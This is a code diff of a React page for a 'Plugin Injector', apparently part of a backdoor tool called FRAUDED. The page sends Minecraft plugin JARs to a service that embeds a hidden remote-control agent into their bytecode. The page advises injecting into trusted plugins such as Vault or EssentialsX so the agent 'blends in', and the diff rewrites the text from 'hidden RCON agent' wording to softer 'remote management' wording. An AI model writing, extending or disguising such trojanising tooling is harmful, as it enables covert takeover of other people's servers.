@@ -31,11 +31,7 @@ export default function Injection() {
     formData.append('platform', platform);
 
     try {
-      const res = await fetch(apiUrl('/api/inject'), {
-        method: 'POST',
-        body: formData,
-      });
-
+      const res = await fetch(apiUrl('/api/inject'), { method: 'POST', body: formData });
       if (res.ok) {
         const blob = await res.blob();
         const url = URL.createObjectURL(blob);
@@ -44,10 +40,7 @@ export default function Injection() {
         a.download = `FRAUDED-${file.name}`;
         a.click();
         URL.revokeObjectURL(url);
-        setResult({
-          type: 'success',
-          message: `Done. ${file.name} now has FRAUDED built in. The plugin will auto-connect on startup.`,
-        });
+        setResult({ type: 'success', message: `${file.name} patched successfully. Add to your server's plugins folder and restart.` });
       } else {
         const err = await res.json().catch(() => ({ error: 'unknown error' }));
         setResult({ type: 'error', message: err.error || 'injection failed' });
@@ -60,30 +53,19 @@ export default function Injection() {
 
   return (
     <div className="injection-container">
-      <div className="injection-panel">
+      <div className="injection-card">
         <h2>Plugin Injector</h2>
         <p>
-          Upload any Paper or Velocity plugin JAR. We inject a remote control agent
-          directly into the bytecode — the plugin still works exactly as before,
-          now with a remote management backend.
-        </p>
-        <p>
-          <strong>How it works:</strong> We rename the original main class, create a
-          wrapper that calls <code>onEnable()</code> on the original then starts our
-          RCON agent. All under <code>io/fraudoor/rcon/</code> — zero conflicts.
+          Upload any Paper, Spigot, or Velocity plugin JAR. A remote management agent
+          is embedded directly into the bytecode — the plugin continues working exactly
+          as before, now with remote access.
         </p>
 
         <div className="platform-select">
-          <button
-            className={`platform-btn ${platform === 'paper' ? 'active' : ''}`}
-            onClick={() => setPlatform('paper')}
-          >
+          <button className={`platform-btn ${platform === 'paper' ? 'active' : ''}`} onClick={() => setPlatform('paper')}>
             Paper / Spigot
           </button>
-          <button
-            className={`platform-btn ${platform === 'velocity' ? 'active' : ''}`}
-            onClick={() => setPlatform('velocity')}
-          >
+          <button className={`platform-btn ${platform === 'velocity' ? 'active' : ''}`} onClick={() => setPlatform('velocity')}>
             Velocity
           </button>
         </div>
@@ -95,67 +77,42 @@ export default function Injection() {
           onDrop={handleDrop}
           onClick={() => fileRef.current?.click()}
         >
-          <div className="icon">📦</div>
-          <div className="label">
-            {file ? file.name : 'Drop a plugin JAR here or click to browse'}
+          <div className="drop-zone-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+              <polyline points="17 8 12 3 7 8"/>
+              <line x1="12" y1="3" x2="12" y2="15"/>
+            </svg>
+          </div>
+          <div className="drop-zone-label">
+            {file ? <strong>{file.name}</strong> : 'Drop a plugin JAR here or click to browse'}
           </div>
         </div>
         <input ref={fileRef} type="file" accept=".jar" style={{ display: 'none' }} onChange={handleFileSelect} />
 
-        <button
-          className="inject-btn"
-          onClick={handleInject}
-          disabled={!file || loading}
-        >
-          {loading
-            ? 'Injecting...'
-            : `Inject into ${file ? file.name : 'plugin'}`
-          }
+        <button className="inject-btn" onClick={handleInject} disabled={!file || loading}>
+          {loading ? 'Processing...' : `Inject into ${file ? file.name : 'plugin'}`}
         </button>
 
-        {result && (
-          <div className={`inject-result ${result.type}`}>
-            {result.message}
-          </div>
-        )}
+        {result && <div className={`inject-result ${result.type}`}>{result.message}</div>}
       </div>
 
-      <div className="injection-panel">
-        <h2>How it works</h2>
-        <p><strong>1.</strong> Upload any plugin JAR (Paper or Velocity)</p>
-        <p><strong>2.</strong> Choose your platform</p>
-        <p><strong>3.</strong> Click inject — the injector service uses ASM to:
-          <br />• Rename the original main class
-          <br />• Create a wrapper that calls the original + starts RCON
-          <br />• Inject our agent class files
-          <br />• Repack the JAR
-        </p>
-        <p><strong>4.</strong> Download the modified JAR — upload it to your server (only 1 plugin needed)</p>
-
-        <div style={{
-          marginTop: '20px',
-          padding: '12px',
-          background: 'var(--bg3)',
-          borderRadius: 'var(--radius)',
-          fontSize: '13px',
-          color: 'var(--text2)',
-        }}>
-            <strong style={{ color: 'var(--orange)' }}>Pro tip:</strong> Inject into a plugin your server already
-            uses (Vault, EssentialsX, anything). It'll blend right in — the agent
-            is completely hidden inside the JAR.
+      <div>
+        <div className="injection-card">
+          <h2>How it works</h2>
+          <p><strong>1.</strong> Upload any plugin JAR</p>
+          <p><strong>2.</strong> Choose Paper or Velocity platform</p>
+          <p><strong>3.</strong> Click inject — ASM bytecode manipulation adds the agent into <code>onEnable()</code></p>
+          <p><strong>4.</strong> Download the modified JAR and place it in your server's plugins folder</p>
+          <p><strong>5.</strong> Restart your server — the agent connects automatically</p>
         </div>
 
-        <div style={{
-          marginTop: '12px',
-          padding: '12px',
-          background: 'var(--bg3)',
-          borderRadius: 'var(--radius)',
-          fontSize: '13px',
-          color: 'var(--text2)',
-        }}>
-          <strong style={{ color: 'var(--accent)' }}>Config:</strong> The agent
-          reads the plugin config for the server URL.
-          Default: <code>ws://localhost:8080/ws</code>
+        <div className="tip-card">
+          <strong>Tip:</strong> Inject into a plugin your server already uses (Vault, Essentials, etc). It blends in naturally.
+        </div>
+
+        <div className="tip-card">
+          <strong>Server URL:</strong> The agent connects to the configured relay server. Default: <code>ws://localhost:8080/ws</code>
         </div>
       </div>
     </div>
